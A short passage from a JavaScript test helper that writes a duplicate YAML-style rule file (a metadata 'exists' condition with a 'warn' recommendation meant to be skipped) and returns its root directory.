      "  where:",
      "    - field: metadata.nonexistent",
      "      op: exists",
      "recommendation:",
      "  control: warn",
      "  text: This duplicate should be skipped.",
      ""
    ].join("\n"),
    "utf8"
  );
  return root;
}
